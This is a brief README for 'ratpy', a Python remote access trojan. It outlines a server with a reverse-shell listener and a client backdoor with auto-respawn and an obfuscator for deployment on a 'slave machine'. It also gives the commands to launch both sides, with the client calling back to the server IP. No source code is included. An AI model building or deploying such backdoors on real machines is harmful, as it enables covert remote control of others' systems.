# ratpy
#### another snake friendly rat
<p align="left">
<img src="imgs/ratpy.png" width="240" height="160">
</p>

#### Backbone branch - simple backdoor without tools

## Architecture
### Master
* interface - server menu and server cli scripting
* threadpool - running paralel code to serve menu while waiting and handling connections set to up to 20 by default
* tools - backdoor :: encrypted reverse shell 30s RAT connection with respawn and client-side
* utils - encryption methods and connection methods
> cd master && python3 main.py <server_ip_addr> <rat_port> <shell_port>
### _________________________________________________________________________

### Slave
* interface - client cli scripting
* tools - RAT client backdoor
* utils - encryption methods and connection methods
* obfuscator - obfuscator for client side RAT deployement
> server :: python3 obfuscator.py && <copy ratpy.py to slave machine>
> python3 ratpy.py <server_ip_addr> <rat_port>
### _________________________________________________________________________

## Adding extensions
* to be written in a new future

## Development to v1.0
* [ ] clean up code, refactor and move args.py to interface
* [ ] write client obfuscator
* [ ] open master branch with binary tools for remote deployment
* [ ] document adding extensions

